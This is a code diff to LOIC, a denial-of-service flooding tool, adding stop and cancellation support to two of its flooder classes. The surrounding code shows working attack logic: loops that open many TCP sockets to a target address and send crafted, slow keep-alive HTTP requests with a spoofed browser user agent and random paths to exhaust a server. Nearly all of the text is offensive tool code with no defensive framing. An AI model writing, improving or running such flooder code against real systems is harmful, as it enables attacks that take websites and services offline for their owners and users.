@@ -126,6 +126,7 @@ namespace LOIC
 
 		private int _nSockets;
 		private List<Socket> _lSockets  = new List<Socket>();
+		private BackgroundWorker bw;
 
 		/// <summary>
 		/// creates the ReCoil object. <.<
@@ -161,15 +162,19 @@ namespace LOIC
 			IsDelayed = true;
 			Requested = 0; // we reset this! - meaning of this counter changes in this context!
 		}
-
 		public override void Start()
 		{
-			IsFlooding = true;
-			var bw = new BackgroundWorker();
-			bw.DoWork += new DoWorkEventHandler(bw_DoWork);
-			bw.RunWorkerAsync();
+			this.IsFlooding = true;
+			this.bw = new BackgroundWorker();
+			this.bw.DoWork += bw_DoWork;
+			this.bw.RunWorkerAsync();
+			this.bw.WorkerSupportsCancellation = true;
 		}
-
+		public override void Stop()
+		{
+			this.IsFlooding = false;
+			this.bw.CancelAsync();
+		}
 		private void bw_DoWork(object sender, DoWorkEventArgs e)
 		{
 			try
@@ -182,7 +187,7 @@ namespace LOIC
 				IPEndPoint RHost = new IPEndPoint(IPAddress.Parse(_ip), _port);
 
 				State = ReqState.Ready;
-				while (IsFlooding)
+				while (this.IsFlooding)
 				{
 					stop = DateTime.UtcNow.AddMilliseconds(Timeout);
 					State = ReqState.Connecting; // SET STATE TO CONNECTING //
@@ -190,6 +195,9 @@ namespace LOIC
 					// forget about slow! .. we have enough saveguards in place!
 					while (IsDelayed && (DateTime.UtcNow < stop))
 					{
+						if(!this.IsFlooding || this.bw.CancellationPending) // XXX: HACKiSH
+							throw new Exception("U dun goofed"); // XXX: HACKiSH²
+
 						Socket socket = new Socket(RHost.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
 						socket.ReceiveTimeout = Timeout;
 						socket.ReceiveBufferSize = bsize;
@@ -333,7 +341,7 @@ namespace LOIC
 			}
 			finally
 			{
-				IsFlooding = false;
+				this.IsFlooding = false;
 				// not so sure about the graceful shutdown ... but why not?
 				for (int i = (_lSockets.Count - 1); i >= 0; i--)
 				{
@@ -365,6 +373,7 @@ namespace LOIC
 		private bool _usegZip;
 
 		private int _nSockets;
+		private BackgroundWorker bw;
 		private List<Socket> _lSockets  = new List<Socket>();
 
 		/// <summary>
@@ -404,16 +413,19 @@ namespace LOIC
 			IsDelayed = true;
 			Requested = 0; // we reset this! - meaning of this counter changes in this context!
 		}
-
-
 		public override void Start()
 		{
-			IsFlooding = true;
-			var bw = new BackgroundWorker();
-			bw.DoWork += new DoWorkEventHandler(bw_DoWork);
-			bw.RunWorkerAsync();
+			this.IsFlooding = true;
+			this.bw = new BackgroundWorker();
+			this.bw.DoWork += bw_DoWork;
+			this.bw.RunWorkerAsync();
+			this.bw.WorkerSupportsCancellation = true;
 		}
-
+		public override void Stop()
+		{
+			this.IsFlooding = false;
+			this.bw.CancelAsync();
+		}
 		private void bw_DoWork(object sender, DoWorkEventArgs e)
 		{
 			try
@@ -425,7 +437,7 @@ namespace LOIC
 				IPEndPoint RHost = new IPEndPoint(IPAddress.Parse(_ip), _port);
 
 				State = ReqState.Ready;
-				while (IsFlooding)
+				while (this.IsFlooding)
 				{
 					stop = DateTime.UtcNow.AddMilliseconds(Timeout);
 					State = ReqState.Connecting; // SET STATE TO CONNECTING //
@@ -433,10 +445,12 @@ namespace LOIC
 					// we have to do this really slow
 					while (IsDelayed && (DateTime.UtcNow < stop))
 					{
+						if(!this.IsFlooding || this.bw.CancellationPending) // XXX: HACKiSH
+							throw new Exception("U dun goofed"); // XXX: HACKiSH²
+
 						if (_random == true)
-						{
 							sbuf = System.Text.Encoding.ASCII.GetBytes(String.Format("{4} {0}{1} HTTP/1.1{2}HOST: {3}{2}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){2}Keep-Alive: 300{2}Connection: keep-alive{2}Content-Length: 42{2}{5}", _subSite, Functions.RandomString(), Environment.NewLine, _dns, ((_useget) ? "GET" : "POST"), ((_usegZip) ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine) : "")));
-						}
+
 						Socket socket = new Socket(RHost.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
 						try
 						{
@@ -501,7 +515,7 @@ namespace LOIC
 			}
 			finally
 			{
-				IsFlooding = false;
+				this.IsFlooding = false;
 				// not so sure about the graceful shutdown ... but why not?
 				for (int i = (_lSockets.Count - 1); i >= 0; i--)
 				{
